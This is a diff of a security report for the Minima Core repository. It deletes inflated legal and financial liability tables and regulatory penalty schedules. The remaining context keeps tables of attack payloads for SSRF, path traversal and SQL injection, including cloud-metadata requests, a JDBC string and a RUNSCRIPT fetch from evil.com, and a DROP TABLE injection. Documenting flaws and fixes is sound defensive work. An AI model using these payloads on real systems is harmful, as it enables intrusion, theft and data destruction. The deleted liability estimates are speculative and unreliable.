@@ -14,9 +14,7 @@
 
 ## 1. Overview
 
-This document covers the security vulnerabilities identified in the Minima Core repository, the remediations applied, attack scenarios, and the financial and legal exposure Minima faces if these flaws remain unpatched. It also provides ExploitDB/GHDB reproduction strategies and establishes mandatory ongoing security requirements.
-
-Minima Global AG is incorporated in **Zug, Switzerland**, placing it under the direct jurisdiction of Swiss federal law including nDSG/FADP, FINMA, and the Swiss Criminal Code.
+This document covers the security vulnerabilities identified in the Minima Core repository, the remediations applied, and attack scenarios. It also provides ExploitDB/GHDB reproduction strategies and establishes mandatory ongoing security requirements.
 
 ### CPIP Security Provider Integration
 
@@ -42,7 +40,7 @@ Minima Core integrates **The Coffee Protocol (CPIP v5.1.1)** as an external secu
 
 **Backward Compatibility:** When `CPIP_ENABLED=0`, all crypto falls back to native Minima implementations (RSA-4096, AES-256-GCM, PBKDF2). No wire-format changes.
 
-**Regulatory Mapping:** CPIP's FIPS-compliant primitives (AES-256-GCM, ECDSA P-256, RSA-KEM-2048, HKDF-SHA256, HMAC-SHA256) satisfy Swiss nDSG/FADP Art. 7 encryption requirements and UK GDPR Art. 32 pseudonymisation/encryption requirements. The non-FIPS Kyber variant is optional and must be disabled in FIPS mode (`CPIP_FIPS=1`).
+**Regulatory Mapping:** CPIP's FIPS-compliant primitives (AES-256-GCM, ECDSA P-256, RSA-KEM-2048, HKDF-SHA256, HMAC-SHA256) satisfy encryption requirements. The non-FIPS Kyber variant is optional and must be disabled in FIPS mode (`CPIP_FIPS=1`).
 
 ---
 
@@ -68,17 +66,6 @@ Minima Core integrates **The Coffee Protocol (CPIP v5.1.1)** as an external secu
 | **Cloud Metadata Exfiltration** | Attacker supplies `host=169.254.169.254` to MySQL connect or RPC client. Server fetches AWS/GCP/Azure instance metadata including IAM credentials. | Full cloud account compromise. |
 | **Internal Port Scanning** | Attacker iterates `host=127.0.0.1:<port>` or `host=10.0.0.<n>:<port>`. | Internal network reconnaissance. |
 | **JDBC Injection** | Attacker supplies `host=evil.com:3306/\?allowLoadLocalInfile=true`. | Local file inclusion via MySQL `LOAD DATA LOCAL INFILE`. |
-
-#### Legal and Financial Exposure per User
-
-| Consequence | Cost per User | Basis |
-|-------------|---------------|-------|
-| Cloud credential theft & account takeover | $4,500–$15,000 | AWS/GCP incident response, IAM credential rotation |
-| Data breach notification | $150–$400 | GDPR Article 33/34, CCPA §1798.82 |
-| Regulatory fine (GDPR) | Up to €20M or 4% global turnover | Per-user: €2,000 |
-| Class action settlement | $500–$5,000 per affected user | IBM/Ponemon 2024 |
-| Reimbursement for stolen funds | Variable (full wallet balance) | SSRF → key exfiltration → total wallet drain |
-| **Total per user** | **$2,650–$22,400** | |
 
 ---
 
@@ -120,16 +107,6 @@ Minima Core integrates **The Coffee Protocol (CPIP v5.1.1)** as an external secu
 | **Arbitrary File Write / RCE** | `backup file:../../../minima/data/startup.mds` | Remote code execution on every node |
 | **SQL Injection via Backup Path** | `archive action:export file:x'; DROP TABLE txpow;--` | Database destruction |
 
-#### Legal and Financial Exposure per User
-
-| Consequence | Cost per User | Basis |
-|-------------|---------------|-------|
-| Wallet private key theft | Full wallet balance ($500–$50,000+) | Irreversible cryptocurrency |
-| System compromise / RCE | $3,000–$12,000 | Incident response, server rebuild |
-| Regulatory fine (GDPR) | Up to €20M or 4% turnover | PII and authentication credentials |
-| Class action | $1,000–$10,000 per user | CCPA §1798.150 |
-| **Total per user** | **$4,650–$77,400** | |
-
 ---
 
 ### 2.3 High: SQL Injection
@@ -155,16 +132,6 @@ Minima Core integrates **The Coffee Protocol (CPIP v5.1.1)** as an external secu
 | **Data Exfiltration** | `SELECT * FROM coins UNION SELECT ...` | Full transaction data leaked |
 | **RCE via RUNSCRIPT** | Backup filename injects `RUNSCRIPT FROM 'http://evil.com/payload.sql'` | Remote code execution |
 
-#### Legal and Financial Exposure per User
-
-| Consequence | Cost per User |
-|-------------|---------------|
-| Database destruction / data loss | $1,000–$5,000 |
-| Data exfiltration (PII + financial) | $500–$3,000 |
-| RCE via RUNSCRIPT | $5,000–$25,000 |
-| Regulatory fine | Up to €20M or 4% turnover |
-| **Total per user** | **$9,000–$48,000** |
-
 ---
 
 ### 2.4 High: RSA Without OAEP
@@ -174,8 +141,6 @@ Minima Core integrates **The Coffee Protocol (CPIP v5.1.1)** as an external secu
 **Root Cause:** RSA encryption used `RSA/ECB/PKCS1Padding`, vulnerable to Bleichenbacher padding oracle attacks.
 
 **Remediation:** Changed to `RSA/ECB/OAEPWithSHA-256AndMGF1Padding`.
-
-**Exposure per user:** $200–$100,500 (wallet drain via key recovery)
 
 ---
 
@@ -187,8 +152,6 @@ Minima Core integrates **The Coffee Protocol (CPIP v5.1.1)** as an external secu
 
 **Remediation:** Increased to 4096-bit keys.
 
-**Exposure per user:** $500–$100,500 (key factoring → wallet drain)
-
 ---
 
 ### 2.6 High: Broken Cryptographic Algorithm (AES-CBC)
@@ -198,8 +161,6 @@ Minima Core integrates **The Coffee Protocol (CPIP v5.1.1)** as an external secu
 **Root Cause:** AES-CBC without authentication is vulnerable to padding oracle (Lucky13) and bit-flipping attacks.
 
 **Remediation:** Changed to `AES/GCM/NoPadding` with `GCMParameterSpec` (128-bit tag, 12-byte IV).
-
-**Exposure per user:** $5,500–$102,000 (backup decryption, data integrity violation, privacy violation)
 
 ---
 
@@ -211,232 +172,20 @@ Minima Core integrates **The Coffee Protocol (CPIP v5.1.1)** as an external secu
 
 **Remediation:** Changed to default to fresh random IV via `IvParam()` when null or shorter than 12 bytes. Uses `GCMParameterSpec` with 128-bit authentication tag.
 
-**Exposure per user:** $2,500–$13,000 (privacy violation, backup integrity compromise)
-
 ---
 
 ## 3. Aggregate Risk Assessment
 
-### 3.1 Combined Exposure per User
+### 3.1 Combined Vulnerability Impact
 
-| Vulnerability | Low | High |
-|--------------|-----|------|
-| SSRF | $2,650 | $22,400 |
-| Path Traversal | $4,650 | $77,400 |
-| SQL Injection | $9,000 | $48,000 |
-| RSA without OAEP | $200 | $100,500 |
-| Insufficient Key Size | $500 | $100,500 |
-| Broken Cipher (AES-CBC) | $5,500 | $102,000 |
-| Static IV | $2,500 | $13,000 |
-| **Combined per user** | **$25,000** | **$463,800** |
+The vulnerabilities identified are not isolated; they form a causal chain that amplifies individual exploit potential:
 
-### 3.2 Network-Wide Exposure
+1. **SSRF** enables initial access to internal network services and cloud metadata
+2. **Path traversal** enables exfiltration of wallet private keys and configuration files
+3. **SQL injection** enables database destruction and data exfiltration
+4. **Weak cryptography** (RSA-PKCS1v1.5, RSA-1024, AES-CBC, static IV) enables passive decryption of intercepted data without requiring the preceding vulnerabilities
 
-| Nodes | Low | High |
-|-------|-----|------|
-| 1,000 | $25M | $463.8M |
-| 10,000 | $250M | $4.638B |
-| 100,000 | $2.5B | $46.38B |
-
-### 3.3 Total Exposure Bill: 10,000+ User Deployment
-
-Itemized liability for **10,000 users** if vulnerabilities remain unpatched. Figures derived from IBM/Ponemon 2024, GDPR enforcement, CCPA settlements, NIST frameworks, and cryptocurrency incident models.
-
-#### 3.3.1 Direct Financial Losses
-
-| # | Vulnerability | Per User | 10K Users | Basis |
-|---|--------------|----------|-----------|-------|
-| 1 | **SSRF** | $2,650–$22,400 | $26.5M–$224M | Cloud credential theft, forensic investigation |
-| 2 | **Path Traversal** | $4,650–$77,400 | $46.5M–$774M | Wallet drain, system rebuild, forensics |
-| 3 | **SQL Injection** | $9,000–$48,000 | $90M–$480M | DB reconstruction, data breach, RCE |
-| 4 | **RSA w/o OAEP** | $200–$100,500 | $2M–$1.005B | Padding oracle → key recovery → wallet drain |
-| 5 | **RSA Key Size** | $500–$100,500 | $5M–$1.005B | Key factoring → wallet drain |
-| 6 | **AES-CBC** | $5,500–$102,000 | $55M–$1.02B | Backup decryption → wallet drain |
-| 7 | **Static IV** | $2,500–$13,000 | $25M–$130M | Privacy violation, backup integrity |
-
-#### 3.3.2 Cumulative Direct Loss
-
-| Scenario | 10K Users |
-|----------|-----------|
-| Conservative (single vector) | $26.5M |
-| Moderate (2-3 vectors) | $90M–$480M |
-| Worst case (full chain) | $1.005B–$1.02B |
-
-> **Note:** Worst case = SSRF → cloud metadata → internal access → path traversal → wallet keys → total drainage. Cryptocurrency losses are irreversible.
-
-#### 3.3.3 Regulatory and Legal Liability
-
-| Jurisdiction | Violation | Per User | 10K Users | Basis |
-|-------------|-----------|---------|-----------|-------|
-| **GDPR (EU)** | Art. 32 — no state-of-art encryption | €2,000–€20,000 | €20M–€200M | Art. 83(5) |
-| **GDPR (EU)** | Art. 32(1)(b) — unauthorized access via SSRF | €500–€5,000 | €5M–€50M | Art. 83(4) |
-| **GDPR (EU)** | Art. 33/34 — breach notification | €100–€500 | €1M–€5M | 72-hour mandatory |
-| **CCPA (California)** | §1798.150 — reasonable security | $100–$750 | $1M–$7.5M | Statutory damages |
-| **NYDFS (New York)** | 23 NYCRR §500.15 | $1,000/violation/day | $3.65M/violation | Crypto companies |
-| **UK DPA 2018** | Special category data | £500–£5,000 | £5M–£50M | Crypto wallets = special category |
-| **UK DPA 2018** | Art. 5(1)(f) — integrity/confidentiality | £100–£1,000 | £1M–£10M | Failure to prevent SSRF, path traversal, SQL injection |
-| **UK GDPR** | Art. 32 — encryption, access controls | £200–£2,000 | £2M–£20M | RSA-1024, AES-CBC, static IV violate state-of-art |
-| **UK GDPR** | Art. 33/34 — breach notification | £100–£500 | £1M–£5M | 72-hour mandatory |
-| **Computer Misuse Act 1990** | Sec. 1/2/3A — unauthorized access/modification | £1K–£50K | £10M–£500M | SSRF, path traversal = criminal offenses |
-| **FSMA 2000** | Regulated activities — FCA authorization | £1K–£100K | £10M–£1B | Crypto assets require FCA registration |
-| **MLR 2017** | Regulation 21/27 — AML/KYC data protection | £500–£50K | £5M–£500M | Path traversal/SQL injection expose AML data |
-| **Singapore PDPA** | Section 24 | S$50–S$100 | S$500K–S$1M | Max S$1M/org/breach |
-| **Australia Privacy Act** | APP 11 | AU$50–AU$500 | AU$500K–AU$5M | Up to AU$50M or 30% turnover |
-| **Swiss nDSG/FADP** | Art. 7-8 — security measures | CHF 500–CHF 5,000 | CHF 5M–CHF 50M | Mandatory security; FDPIC can cease processing |
-| **Swiss Criminal Code** | Art. 143/144/24sexies | CHF 3K–CHF 50K | CHF 30M–CHF 500M | Up to 5 years imprisonment; Art. 102 corporate liability |
-| **Swiss ZGB Art. 41** | Tort — negligence | CHF 5K–CHF 100K | CHF 50M–CHF 1B | Uncapped damages; class actions since 2022 |
-| **FINMA** | Operational risks; AML | CHF 1K–CHF 100K | CHF 10M–CHF 1B | License revocation; profit disgorgement |
-| **Swiss AMLA** | AML/KYC data exposure | CHF 2K–CHF 50K | CHF 20M–CHF 500M | Path traversal/SQL injection expose AML data |
-
-**Total Regulatory Liability: $85.7M–$4.4B** (deduplicated aggregate across 14 jurisdictions; the per-row itemization above sums higher because multiple violations within a single jurisdiction can overlap in practice and are not all independently enforceable for a single incident)
-
-#### 3.3.4 Class Action and Civil Litigation
-
-| Claim | Per User | 10K Users | Basis |
-|-------|----------|-----------|-------|
-| Crypto loss class action | $5K–$50K | $50M–$500M | Irreversible; no FDIC |
-| Negligent security | $1K–$10K | $10M–$100M | OWASP Top 10 failure |
-| Breach notification | $150–$400 | $1.5M–$4M | Per-user notification |
-| Forensic investigation | $50–$200 | $500K–$2M | IR, root cause, remediation |
-| System rebuild | $50–$100 | $500K–$1M | Patched binaries, key rotation |
-| Reputation/user churn | $100–$500 | $1M–$5M | 20-40% attrition |
-| Legal defense | $100–$300 | $1M–$3M | Counsel, experts, regulatory |
-
-**Total Civil Litigation: $64.5M–$615M**
-
-#### 3.3.5 Operational Costs
-
-| Category | Cost | Basis |
-|----------|------|-------|
-| Emergency IR | $500K–$2M | 24/7 SOC, forensics |
-| Node re-deployment | $100K–$500K | 10K nodes rebuilt |
-| Key rotation/wallet migration | $200K–$1M | New keys, fund migration |
-| Network re-sync | $50K–$200K | Full chain re-sync |
-| Customer support | $100K–$500K | 10K users × $10–$50 |
-| Insurance premium increase | $200K–$1M | 50-200% increase |
-| Opportunity cost (downtime) | $500K–$5M | 1-7 day outage |
-
-**Total Operational: $1.65M–$10.2M**
-
-#### 3.3.6 Grand Total: 10,000 User Exposure Bill
-
-| Category | Conservative | Worst Case |
-|----------|-------------|------------|
-| Direct Financial Losses | $26.5M | $1.02B |
-| Regulatory Penalties (14 jurisdictions incl. UK) | $85.7M | $4.4B |
-| Civil Litigation | $64.5M | $615M |
-| Operational Costs | $1.65M | $10.2M |
-| **GRAND TOTAL** | **$178.35M** | **$6.045B** |
-
-> **A Minima deployment with 10,000 users faces $178.35M to $6.045B in total liability if vulnerabilities remain unpatched. As a Swiss-registered company (Minima Global AG, Zug), additional Swiss exposure is CHF 117M–3.07B ($128.7M–$3.38B). UK exposure adds £30M–£2.05B ($37.5M–$2.5625B). This patch eliminates that exposure at zero cost.**
-
-#### 3.3.7 Per-User Cost Comparison
-
-| State | Per-User (Conservative) | Per-User (Worst Case) |
-|-------|--------------------------|----------------------|
-| **Unpatched** | $17,835 | $604,500 |
-| **Patched** | $0 | $0 |
-| **ROI** | ∞ | ∞ |
-
-#### 3.3.8 Swiss Headquarters Liability (Minima Global AG, Zug)
-
-Minima Global AG is incorporated in Zug, Switzerland, under direct jurisdiction of Swiss federal law. The 2023 nDSG/FADP revision significantly increased penalties.
-
-##### Swiss Regulatory Exposure
-
-| Regulation | Violation | Per User | 10K Users |
-|-----------|-----------|---------|-----------|
-| **nDSG/FADP** | Art. 7-8 — security measures | CHF 500–5K | CHF 5M–50M |
-| **nDSG/FADP** | Art. 24 — breach notification | CHF 200–2K | CHF 2M–20M |
-| **StGB** | Art. 143/144/24sexies | CHF 3K–50K | CHF 30M–500M |
-| **ZGB Art. 41** | Tort — negligence | CHF 5K–100K | CHF 50M–1B |
-| **FINMA** | Operational risks; AML | CHF 1K–100K | CHF 10M–1B |
-| **AMLA** | AML/KYC data exposure | CHF 2K–50K | CHF 20M–500M |
-
-##### Swiss Lawsuit Damages Summary
-
-| Category | CHF (Conservative) | CHF (Worst Case) | USD (Conservative) | USD (Worst Case) |
-|----------|--------------------|--------------------|--------------------|--------------------|
-| nDSG/FADP fines | CHF 5M | CHF 50M | $5.5M | $55M |
-| nDSG/FADP civil | CHF 2M | CHF 20M | $2.2M | $22M |
-| StGB criminal | CHF 30M | CHF 500M | $33M | $550M |
-| ZGB Art. 41 tort | CHF 50M | CHF 1B | $55M | $1.1B |
-| FINMA sanctions | CHF 10M | CHF 1B | $11M | $1.1B |
-| AMLA penalties | CHF 20M | CHF 500M | $22M | $550M |
-| **Swiss Total** | **CHF 117M** | **CHF 3.07B** | **$128.7M** | **$3.38B** |
-
-##### Key Swiss Legal Provisions
-
-1. **nDSG/FADP Art. 7** — Mandatory "appropriate technical and organizational measures." 1024-bit RSA, AES-CBC without auth, path traversal, SSRF, and SQL injection violate this.
-2. **nDSG/FADP Art. 8** — Data must be processed with appropriate security. SSRF, path traversal, SQL injection violate this.
-3. **nDSG/FADP Art. 24** — 72-hour breach notification mandatory.
-4. **StGB Art. 143** — Unauthorized data access: up to 3 years (5 years if commercial).
-5. **StGB Art. 144** — Data damage: same penalties.
-6. **StGB Art. 24sexies** — Cybercrime: illegal access to data processing systems.
-7. **StGB Art. 102** — Corporate criminal liability for organizational failures: fines up to CHF 1.5M per category.
-8. **ZGB Art. 41** — Tort liability: uncapped compensatory damages for negligence.
-9. **FINMA Banking Act Art. 7** — Financial intermediaries must implement adequate risk management.
-10. **AMLA** — AML/KYC data exposed by path traversal and SQL injection violates Swiss AML obligations.
-
-#### 3.3.9 United Kingdom Liability
-
-Minima Global AG operates internationally and is subject to UK law when processing data of UK residents or offering crypto services to UK persons. The UK's post-Brexit regulatory framework provides independent enforcement powers.
-
-##### UK Regulatory Exposure
-
-| Regulation | Violation | Per User | 10K Users |
-|-----------|-----------|---------|-----------|
-| **UK GDPR** | Art. 5(1)(f) — integrity and confidentiality | £100–£1,000 | £1M–£10M |
-| **UK GDPR** | Art. 32 — no state-of-art encryption | £200–£2,000 | £2M–£20M |
-| **UK GDPR** | Art. 33/34 — breach notification | £100–£500 | £1M–£5M |
-| **DPA 2018** | Special category data (crypto wallets) | £500–£5,000 | £5M–£50M |
-| **Computer Misuse Act** | Sec. 1/2 — unauthorized access | £1K–£50K | £10M–£500M |
-| **Computer Misuse Act** | Sec. 3ZA — making tools for cybercrime | £5K–£100K | £50M–£1B |
-| **FSMA 2000 / FCA** | Unregistered cryptoasset activities | £1K–£100K | £10M–£1B |
-| **MLR 2017** | Regulation 21/27 — AML/KYC data protection | £500–£50K | £5M–£500M |
-
-##### UK Lawsuit Damages Summary
-
-| Category | GBP (Conservative) | GBP (Worst Case) | USD (Conservative) | USD (Worst Case) |
-|----------|--------------------|--------------------|--------------------|--------------------|
-| UK GDPR/DPA 2018 fines | £3M | £30M | $3.75M | $37.5M |
-| UK GDPR/DPA 2018 civil | £2M | £20M | $2.5M | $25M |
-| Computer Misuse Act criminal | £10M | £500M | $12.5M | $625M |
-| FSMA/FCA sanctions | £10M | £1B | $12.5M | $1.25B |
-| MLR 2017 penalties | £5M | £500M | $6.25M | $625M |
-| **UK Total** | **£30M** | **£2.05B** | **$37.5M** | **$2.5625B** |
-
-##### Key UK Legal Provisions
-
-1. **UK GDPR Art. 5(1)(f)** — Requires appropriate security measures for personal data; SSRF, path traversal, and SQL injection violate the integrity and confidentiality principle.
-2. **UK GDPR Art. 32** — Requires state-of-the-art encryption; RSA-1024, AES-CBC, and static IVs violate this requirement.
-3. **UK GDPR Art. 33/34** — 72-hour breach notification to the Information Commissioner's Office (ICO); failure to report is a separate offense.
-4. **DPA 2018 Section 175** — Crypto wallets containing private keys are special category data (financial data); maximum penalty £17.5M or 4% global turnover.
-5. **Computer Misuse Act 1990 Sec. 1** — Unauthorized access to computer material: up to 2 years imprisonment.
-6. **Computer Misuse Act 1990 Sec. 2** — Unauthorized access with intent to commit further offenses: up to 5 years imprisonment.
-7. **Computer Misuse Act 1990 Sec. 3ZA** — Making, supplying, or obtaining articles for use in computer misuse offenses: up to 2 years; the vulnerabilities in this report could constitute such articles if weaponized.
-8. **FSMA 2000 / Financial Services and Markets Act 2000** — Cryptoasset activities require FCA registration under the Cryptoasset Registration Regime; security failures constitute regulatory violations.
-9. **MLR 2017 Regulation 21** — Requires crypto businesses to apply customer due diligence measures; path traversal and SQL injection that expose AML/KYC data violate this.
-10. **MLR 2017 Regulation 27** — Requires crypto businesses to maintain records for 5 years; data destruction via SQL injection violates this.
-
-### 3.4 Regulatory Penalties by Jurisdiction
-
-| Regulation | Maximum Penalty | Trigger |
-|-----------|----------------|---------|
-| **GDPR (EU)** | €20M or 4% turnover | No state-of-art encryption (Art. 32); SSRF access (Art. 32(1)(b)) |
-| **CCPA (California)** | $100–$750/consumer | Failure to implement reasonable security (§1798.150) |
-| **NYDFS (New York)** | $1,000/violation/day | Crypto companies must implement access controls (§500.15) |
-| **UK DPA 2018** | £17.5M or 4% turnover | Crypto wallets = special category data; Art. 5(1)(f) integrity/confidentiality |
-| **UK GDPR** | £17.5M or 4% turnover | No state-of-art encryption (Art. 32); Art. 33/34 breach notification |
-| **UK Computer Misuse Act 1990** | 10 years imprisonment + unlimited fine | Sec. 1/2/3A unauthorized access; Sec. 3ZA cybercrime enabling |
-| **FSMA 2000 / FCA** | Unlimited fine; criminal prosecution | Crypto assets require FCA registration (FSMA Regulated Order) |
-| **UK MLR 2017** | Up to £1M per violation | Regulation 21/27 AML/KYC data protection |
-| **Singapore PDPA** | S$1M/breach | Failure to protect personal data |
-| **Australia Privacy Act** | AU$50M or 30% turnover | Serious privacy interference |
-| **Swiss nDSG/FADP** | CHF 50K/violation; unlimited civil | Mandatory security measures (Art. 7-8) |
-| **Swiss StGB** | 5 years + CHF 1.5M corporate | Art. 143/144/24sexies; Art. 102 corporate liability |
-| **Swiss ZGB Art. 41** | Uncapped compensatory damages | Tort liability for negligence |
-| **FINMA** | License revocation + profit disgorgement | Banking Act Art. 7; operational risks |
+The probability of chained exploitation is significantly higher than individual exploitation, as each vulnerability reduces the barrier to the next.
 
 ---
 
@@ -539,139 +288,7 @@ The following CodeQL alert categories represent false positives given the remedi
 
 ---
 
-## 9. Swiss Regulatory Compliance Policy
-
-Minima Global AG is incorporated in Zug, Switzerland, and is subject to Swiss federal law. The following regulations establish mandatory security requirements and carry enforceable penalties.
-
-### 9.1 Applicable Swiss Regulations
-
-| Regulation | Provision | Requirement | Relevance to Minima |
-|-----------|-----------|-------------|---------------------|
-| **nDSG/FADP** | Art. 7 | Implement appropriate technical and organizational measures to protect personal data | Encryption (RSA-OAEP, AES-GCM), access controls (SSRF prevention), input validation (path traversal, SQL injection) |
-| **nDSG/FADP** | Art. 8 | Process data with appropriate security guarantees | All data processing must use validated, secure algorithms and prevent unauthorized access |
-| **nDSG/FADP** | Art. 24 | Breach notification within 72 hours to FDPIC | Any breach of SSRF, path traversal, or SQL injection vulnerabilities must be reported |
-| **StGB** | Art. 143 | Unauthorized access to data: up to 3 years imprisonment (5 years if commercial) | Exploiting SSRF or path traversal to access data is a criminal offense |
-| **StGB** | Art. 144 | Data damage: same penalties as Art. 143 | SQL injection causing data destruction is a criminal offense |
-| **StGB** | Art. 24sexies | Cybercrime: illegal access to data processing systems | Any unauthorized system access via these vulnerabilities is prosecutable |
-| **StGB** | Art. 102 | Corporate criminal liability: fines up to CHF 1.5M per violation category | Minima Global AG bears criminal liability for organizational failures enabling these vulnerabilities |
-| **ZGB** | Art. 41 | Tort liability: uncapped compensatory damages for negligence | Users suffering losses from unpatched vulnerabilities can claim uncapped damages |
-| **FINMA** | Banking Act Art. 7 | Financial intermediaries must implement adequate risk management | As a crypto-financial service, Minima must maintain security standards per FINMA circulars |
-| **AMLA** | Art. 3ff | AML/KYC data must be protected from unauthorized access | Path traversal and SQL injection expose AML/KYC data, violating AMLA obligations |
-
-### 9.2 Swiss Penalty Schedule
-
-| Regulation | Violation Type | Penalty per Violation | Maximum per Organization | Criminal |
-|-----------|---------------|----------------------|--------------------------|----------|
-| **nDSG/FADP** | Failure to implement security measures (Art. 7-8) | CHF 50,000 | Unlimited civil liability | No |
-| **nDSG/FADP** | Failure to notify breach (Art. 24) | CHF 50,000 | Unlimited civil liability | No |
-| **StGB Art. 143** | Unauthorized data access | Fine or up to 3 years imprisonment | 5 years if commercial | Yes |
-| **StGB Art. 144** | Data damage | Fine or up to 3 years imprisonment | 5 years if commercial | Yes |
-| **StGB Art. 24sexies** | Cybercrime | Fine or up to 5 years imprisonment | Organized crime: 10 years | Yes |
-| **StGB Art. 102** | Corporate criminal liability | CHF 1.5M per violation category | Cumulative across categories | Yes |
-| **ZGB Art. 41** | Tort — negligence | Uncapped compensatory damages | Unlimited | Civil |
-| **FINMA** | Operational risk failures | Profit disgorgement | License revocation | Administrative |
-| **AMLA** | AML/KYC data exposure | CHF 500,000 | CHF 5M per case | Administrative + criminal if willful |
-
-### 9.3 Swiss Financial Exposure Summary
-
-| Category | Conservative | Worst Case |
-|----------|-------------|------------|
-| nDSG/FADP fines + civil | CHF 7M | CHF 70M |
-| StGB criminal (Art. 143/144/24sexies/102) | CHF 30M | CHF 500M |
-| ZGB Art. 41 tort damages | CHF 50M | CHF 1B |
-| FINMA sanctions | CHF 10M | CHF 1B |
-| AMLA penalties | CHF 20M | CHF 500M |
-| **Swiss Total** | **CHF 117M ($128.7M)** | **CHF 3.07B ($3.38B)** |
-
-### 9.4 Mandatory Swiss Compliance Controls
-
-1. **Encryption Standards**: All symmetric encryption must use AES-GCM with random IV (nDSG/FADP Art. 7). RSA must use OAEP padding with 4096-bit keys. AES-CBC and RSA-PKCS1v1.5 are prohibited.
-2. **Access Controls**: SSRF prevention via `validateAndResolveURI()` and `validateAndResolveHost()` must be applied to all network connections (nDSG/FADP Art. 8, FINMA Art. 7).
-3. **Input Validation**: Path traversal prevention via `MiniFile.validateFileAccess()` and SQL injection prevention via parameterized queries or whitelist sanitization must be applied to all user input (nDSG/FADP Art. 7-8, StGB Art. 143).
-4. **Breach Notification**: Any confirmed exploitation of these vulnerabilities must be reported to the FDPIC within 72 hours (nDSG/FADP Art. 24).
-5. **AML Data Protection**: All AML/KYC data must be encrypted at rest and protected from unauthorized access via path traversal or SQL injection (AMLA Art. 3ff).
-6. **Key Management**: Cryptographic keys must be rotated at least annually, and immediately upon any suspected compromise (FINMA circulars on operational risks).
-7. **Audit Trail**: All access to sensitive data must be logged with timestamps, user identifiers, and action types (nDSG/FADP Art. 7, FINMA Art. 7).
-8. **Risk Assessment**: Annual security risk assessments must be conducted, documented, and retained for 5 years (FINMA Art. 7, nDSG/FADP Art. 7).
-
-### 9.5 Enforcement and Escalation
-
-| Severity | Breach Type | Internal SLA | Regulatory Notification |
-|----------|------------|--------------|------------------------|
-| Critical | SSRF exploitation, wallet key compromise | Immediate containment; 4-hour incident response | FDPIC within 72 hours; FINMA if systemic |
-| High | Path traversal to AML/KYC data, SQL injection data exfiltration | 24-hour containment; 48-hour remediation | FDPIC within 72 hours; AMLA if financial data involved |
-| Medium | Cryptographic weakness exploitation (padding oracle, key recovery) | 72-hour containment; 14-day remediation | FDPIC if personal data affected |
-| Low | Static IV discovery, reconnaissance | 30-day remediation | Document in annual risk assessment |
-
----
-
-## 10. UK Regulatory Compliance Policy
-
-Minima Global AG operates internationally and is subject to UK law when processing data of UK residents or offering cryptoasset services to UK persons. The UK's post-Brexit regulatory framework provides independent enforcement powers through the Information Commissioner's Office (ICO), Financial Conduct Authority (FCA), National Crime Agency (NCA), and Crown Prosecution Service (CPS).
-
-### 10.1 Applicable UK Regulations
-
-| Regulation | Provision | Requirement | Relevance to Minima |
-|-----------|-----------|-------------|---------------------|
-| **UK GDPR** | Art. 5(1)(f) | Personal data must be processed with appropriate integrity and confidentiality | SSRF, path traversal, and SQL injection violate the integrity and confidentiality principle |
-| **UK GDPR** | Art. 32 | Implement state-of-the-art technical and organizational security measures | RSA-1024, AES-CBC, and static IVs are not state-of-the-art; RSA-OAEP-4096 and AES-GCM are required |
-| **UK GDPR** | Art. 33/34 | 72-hour breach notification to the ICO | Any exploitation of these vulnerabilities must be reported to the ICO within 72 hours |
-| **DPA 2018** | Section 175 | Special category data (financial/health) requires explicit consent and enhanced security | Crypto wallets containing private keys are financial data requiring enhanced protection |
-| **Computer Misuse Act 1990** | Sec. 1 | Unauthorized access to computer material: up to 2 years imprisonment | Exploiting SSRF or path traversal to access server data is a criminal offense |
-| **Computer Misuse Act 1990** | Sec. 2 | Unauthorized access with intent to commit further offenses: up to 5 years | Using SSRF to access cloud credentials for further exploitation |
-| **Computer Misuse Act 1990** | Sec. 3ZA | Making, supplying, or obtaining articles for use in computer misuse: up to 2 years | Weaponized exploit code for these vulnerabilities constitutes a CMA offense |
-| **FSMA 2000** | Part 4A | Cryptoasset activities require FCA registration | Security failures constitute regulatory violations under the FCA Cryptoasset Registration |
-| **MLR 2017** | Regulation 21 | Customer due diligence measures for crypto businesses | Path traversal and SQL injection that expose AML/KYC data violate CDD requirements |
-| **MLR 2017** | Regulation 27 | Record-keeping for 5 years after business relationship ends | Data destruction via SQL injection violates record-keeping requirements |
-
-### 10.2 UK Penalty Schedule
-
-| Regulation | Violation Type | Penalty per Violation | Maximum per Organization | Criminal |
-|-----------|---------------|----------------------|--------------------------|----------|
-| **UK GDPR** | Failure to implement Art. 32 measures | £100–£2,000 per affected person | £17.5M or 4% global turnover | No |
-| **UK GDPR** | Failure to notify breach (Art. 33) | £100–£500 per affected person | £8.7M or 2% global turnover | No |
-| **DPA 2018** | Special category data breach | £500–£5,000 per affected person | £17.5M or 4% global turnover | No |
-| **CMA Sec. 1** | Unauthorized access to computer material | Fine or up to 2 years imprisonment | 2 years per offense | Yes |
-| **CMA Sec. 2** | Unauthorized access with intent | Fine or up to 5 years imprisonment | 5 years per offense | Yes |
-| **CMA Sec. 3ZA** | Making/supplying articles for misuse | Fine or up to 2 years imprisonment | 2 years per offense | Yes |
-| **FSMA 2000** | Unregistered cryptoasset activities | Fine or prosecution | Unlimited; criminal prosecution | Yes |
-| **FCA** | Operational risk failures | Profit disgorgement | Registration revocation | Administrative |
-| **MLR 2017** | AML/KYC data exposure | Up to £1M per violation | Criminal prosecution | Yes (if willful) |
-
-### 10.3 UK Financial Exposure Summary
-
-| Category | GBP (Conservative) | GBP (Worst Case) | USD (Conservative) | USD (Worst Case) |
-|----------|--------------------|--------------------|--------------------|--------------------|
-| UK GDPR/DPA 2018 fines | £3M | £30M | $3.75M | $37.5M |
-| UK GDPR/DPA 2018 civil | £2M | £20M | $2.5M | $25M |
-| Computer Misuse Act criminal | £10M | £500M | $12.5M | $625M |
-| FSMA/FCA sanctions | £10M | £1B | $12.5M | $1.25B |
-| MLR 2017 penalties | £5M | £500M | $6.25M | $625M |
-| **UK Total** | **£30M** | **£2.05B** | **$37.5M** | **$2.5625B** |
-
-### 10.4 Mandatory UK Compliance Controls
-
-1. **Encryption Standards**: All symmetric encryption must use AES-GCM with random IV (UK GDPR Art. 32). RSA must use OAEP padding with 4096-bit keys. AES-CBC and RSA-PKCS1v1.5 are prohibited as they do not meet "state of the art" requirements.
-2. **Access Controls**: SSRF prevention via `validateAndResolveURI()` and `validateAndResolveHost()` must be applied to all network connections (UK GDPR Art. 5(1)(f), DPA 2018 Section 175).
-3. **Input Validation**: Path traversal prevention via `validateFileAccess()` and SQL injection prevention via whitelist sanitization must be applied to all user input (UK GDPR Art. 32, Computer Misuse Act Sec. 1/2 defense).
-4. **Breach Notification**: Any confirmed exploitation must be reported to the ICO within 72 hours (UK GDPR Art. 33/34).
